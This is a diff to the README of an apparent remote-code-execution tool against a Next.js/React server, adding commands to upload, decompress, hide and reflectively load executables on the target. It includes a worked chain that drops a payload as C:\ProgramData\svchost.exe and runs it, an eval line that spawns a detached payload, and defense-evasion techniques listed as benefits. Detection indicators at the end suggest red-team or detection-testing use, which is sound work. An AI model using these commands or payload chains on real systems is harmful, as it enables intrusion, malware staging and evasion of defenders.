@@ -26,6 +26,7 @@ react2shell-tool/
 ├── run_exploit.py          # Interactive shell launcher  ← use this
 ├── encode_payload.py       # Encode local binary → base64 (no line breaks)
 ├── decode_payload.py       # Decode base64 → binary locally
+├── compress_payload.py     # Compress + base64 encode (T1027.015)  ← NEW
 └── exploit_tool/
     ├── main.py             # Arg parsing, creates InteractiveShell
     ├── shell.py            # InteractiveShell — command loop & dispatch
@@ -36,7 +37,7 @@ react2shell-tool/
     ├── utils.py            # to_charcode() helper
     └── commands/
         ├── builtin.py      # info, help, history, timeout, eval, run
-        └── file_ops.py     # upload, decode, copyfile, rename, download
+        └── file_ops.py     # upload, decode, decompress, copyfile, rename, download
 ```
 
 **Request/Response flow:**
@@ -160,17 +161,22 @@ throw Object.assign(new Error('NEXT_REDIRECT'), {digest: `NEXT_REDIRECT;push;/lo
 
 ## Commands Reference
 
-### File Operations — all eval-based, no spawn (`file_ops.py`)
+### File Operations (`file_ops.py`)
 
-| Command | Signature | Description |
-| ------- | --------- | ----------- |
-| `upload` | `upload <local.b64> [remote_dest]` | Reads local b64 file, uploads in **2000-char chunks** via `fs.writeFileSync` (chunk 0) / `fs.appendFileSync` (chunks 1+). `remote_dest` defaults to `out.b64` |
-| `decode` | `decode <in.b64> <out.file>` | Decodes b64 on target: `fs.writeFileSync(out, Buffer.from(fs.readFileSync(in,'utf8').trim(),'base64'))` |
-| `copyfile` | `copyfile <src> <dst>` | `fs.copyFileSync(src, dst)` on target |
-| `rename` | `rename <old> <new>` | `fs.renameSync(old, new)` on target |
-| `download` | `download <remote_path>` | Binary-safe chunked download: `fs.statSync` → access check → `fs.openSync`/`fs.readSync` in **8192-byte chunks** → base64 per chunk → written locally as `downloaded_<filename>` |
+| Command | Signature | Description | Spawns Process? |
+| ------- | --------- | ----------- | --------------- |
+| `upload` | `upload <local.b64> [remote_dest]` | Reads local b64 file, uploads in **2000-char chunks** via `fs.writeFileSync` (chunk 0) / `fs.appendFileSync` (chunks 1+). `remote_dest` defaults to `out.b64` | ❌ No — eval only |
+| `decode` | `decode <in.b64> <out.file>` | Decodes b64 on target: `fs.writeFileSync(out, Buffer.from(fs.readFileSync(in,'utf8').trim(),'base64'))` | ❌ No — eval only |
+| `decompress` | `decompress <in.gz> <out.file>` | **T1027.015** — Decompresses gzip on target: `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` — **built-in zlib module** | ❌ No — eval only |
+| `copyfile` | `copyfile <src> <dst>` | `fs.copyFileSync(src, dst)` on target | ❌ No — eval only |
+| `rename` | `rename <old> <new>` | `fs.renameSync(old, new)` on target | ❌ No — eval only |
+| `download` | `download <remote_path>` | Binary-safe chunked download: `fs.statSync` → access check → `fs.openSync`/`fs.readSync` in **8192-byte chunks** → base64 per chunk → written locally as `downloaded_<filename>` | ❌ No — eval only |
+| `hide` | `hide <filepath>` | **T1564.001** — Sets Windows hidden attribute: `spawnSync('attrib', ['+h', filepath])` — spawns `attrib.exe` with visible process creation | ✅ **Yes** — `attrib.exe` |
+| `herpload` | `herpload <payload.b64> <CertEnrollAgent.exe>` | **T1620** — Reflective PE loading via stdin redirection: reads b64 file, decodes to Buffer, spawns loader with stdin pipe containing payload bytes (no disk write for payload) | ✅ **Yes** — loader exe |
 
-All file ops wrap their JS code in `eval(String.fromCharCode(...))` to avoid quote issues.
+**Notes:**
+- All eval-only commands wrap JS code in `eval(String.fromCharCode(...))` to avoid quote issues
+- `hide` and `herpload` spawn processes — intentional for Calibrated detection (T1564.001, T1620)
 
 ### Built-in Commands (`builtin.py`, `shell.py`)
 
@@ -189,7 +195,7 @@ All file ops wrap their JS code in `eval(String.fromCharCode(...))` to avoid quo
 
 ## File Transfer Workflow
 
-### Upload binary to target
+### Upload binary to target (standard)
 
 ```powershell
 # 1. Encode locally (PowerShell — no line breaks)
@@ -211,6 +217,39 @@ rce > decode out.b64 payload.exe
 rce > run payload.exe
 rce > eval process.mainModule.require('child_process').spawn('C:/path/payload.exe',[],{detached:true,stdio:'ignore'}).unref()
 ```
+
+### Upload compressed binary (T1027.015 — Compression)
+
+```bash
+# 1. Compress + encode locally (single line for upload efficiency)
+python compress_payload.py payload.exe -o payload.gz.b64 --b64 -l 0
+
+# Output example:
+# [+] Compression successful!
+# [*] Original size: 524288 bytes
+# [*] Compressed size: 198456 bytes
+# [*] Compression ratio: 62.2%
+# [*] Base64 size: 264608 bytes
+# [*] Output file: payload.gz.b64 (264608 bytes)
+# [*] Format: single line (no wrapping)
+```
+
+```bash
+# 2. Upload compressed payload
+rce > upload payload.gz.b64 C:\Windows\Temp\svc.gz.b64
+
+# 3. Decompress on target (T1027.015 — zlib.gunzipSync, NO spawn)
+rce > decompress C:\Windows\Temp\svc.gz.b64 C:\ProgramData\svchost.exe
+
+# 4. Execute
+rce > run C:\ProgramData\svchost.exe
+```
+
+**Benefits:**
+- **62%+ size reduction** — faster upload, less network traffic
+- **Defense Evasion** — T1027.015 Compression obfuscation
+- **No spawn** — `zlib` is built-in Node.js module, pure eval execution
+- **Detection observable** — `node.exe` reads `.gz.b64`, decompresses via `zlib`, writes `.exe`
 
 ### Download file from target
 
@@ -327,9 +366,12 @@ All methods are `@staticmethod`.
 | ------ | --------- | ----------- |
 | `upload` | `upload(args: str)` | Parses `<local.b64> [remote_dest]`. Default dest `out.b64`. Reads local file, sends in 2000-char chunks via `writeFileSync`/`appendFileSync` |
 | `decode` | `decode(args: str)` | Parses `<in.b64> <out.file>`. Runs `fs.writeFileSync(out, Buffer.from(fs.readFileSync(in,'utf8').trim(),'base64'))` on target |
+| `decompress` | `decompress(args: str)` | **T1027.015** — Parses `<in.gz> <out.file>`. Runs `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` on target — built-in `zlib` module, no spawn |
 | `copy` | `copy(args: str)` | Parses `<src> <dst>`. Runs `fs.copyFileSync(src, dst)` on target |
 | `rename` | `rename(args: str)` | Parses `<old> <new>`. Runs `fs.renameSync(old, new)` on target |
 | `download` | `download(remote_path: str)` | stat → access check via `new Function(...)()` → loop `fs.readSync` (8192 bytes/chunk) → saves as `downloaded_<filename>` |
+| `hide` | `hide(filepath: str)` | **T1564.001** — Sets Windows hidden attribute via `attrib.exe +h` (spawns `attrib.exe` — observable process creation) |
+| `herpload` | `herpload(args: str)` | **T1620** — Reflectively loads PE via stdin redirection; reads b64 file, decodes to Buffer, spawns CertEnrollAgent.exe with stdin pipe containing payload bytes (no disk artifact) |
 
 ### `BuiltinCommands` (`commands/builtin.py`)
 
@@ -365,3 +407,7 @@ def to_charcode(s):
 - `X-Action-Redirect: /login?a=<base64>` in response headers
 - `node.exe` → `cmd.exe` or unexpected child process spawns
 - High-entropy `eval(String.fromCharCode(...))` patterns in server-side request logs
+- **T1027.015 Compression**: `node.exe` reads `.gz` file, `zlib.gunzipSync` API call, writes `.exe`/`.dll` to disk
+- File creation pattern: `.b64` → `.gz` → `.exe` (upload → decompress → execute chain)
+- Chunked file writes via `fs.appendFileSync` (2000-char chunks for upload)
+- `attrib.exe` spawned by `node.exe` with `+h` flag (T1564.001 - Hide Artifacts)
